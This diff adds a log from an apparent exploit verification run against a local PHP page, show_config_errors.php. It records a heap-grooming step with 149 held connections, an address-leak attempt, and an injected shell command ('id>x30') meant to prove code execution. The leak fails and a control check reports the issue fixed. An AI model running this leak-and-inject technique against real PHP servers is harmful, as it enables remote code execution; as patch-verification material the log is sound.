@@ -1,0 +1,42 @@
+Local time context: 2026-10-25 Australia/Adelaide
+Target: http://127.0.0.1:18213/show_config_errors.php
+
+Pre-run marker check:
+PROOF_ABSENT
+
+Runner console output:
+[*] blockers connected 149/149; settling 10.0s
+[*] blockers alive after settle 149/149; failures=0
+rotate: A-fill + minimal session end
+leak attempt 1/1
+  cookie=32B ptrs=0 heap=0x0 libphp=0x0
+{
+  "target": "http://127.0.0.1:18213/show_config_errors.php",
+  "host_header": "x",
+  "requested_blockers": 149,
+  "command": "id>x30",
+  "fetch": "/x30",
+  "exact_profile_acknowledged": true,
+  "connected_blockers": 149,
+  "blocker_failures_at_start": 0,
+  "blockers_alive_after_settle": 149,
+  "blocker_failures_after_settle": 0,
+  "heap": "0x0",
+  "libphp": "0x0",
+  "blockers_alive_after_leak": 149,
+  "blocker_failures_after_leak": 0,
+  "status": "leak_failed"
+}
+
+Independent control readback:
+FIXED_NO_PROOF
+FIXED_HTTP=200
+
+Runtime identity:
+PHP 8.4.27
+992b4b07fd4880b2dd5be75a4912e0dc619ca08e1a4ff0c7eac0dce4c1aa7c31  /usr/lib/apache2/modules/libphp.so
+a3106c711821bf84912686c2f94f55dc09eb31e2f53831b034b2f6336ab2ac1f  /var/www/html/show_config_errors.php
+<body id=loginform>
+
+Container image:
+sha256:d54e07f80e7e55c5140e83c01f9cb25f232991efccce7cc485a1824a8e68bdfd
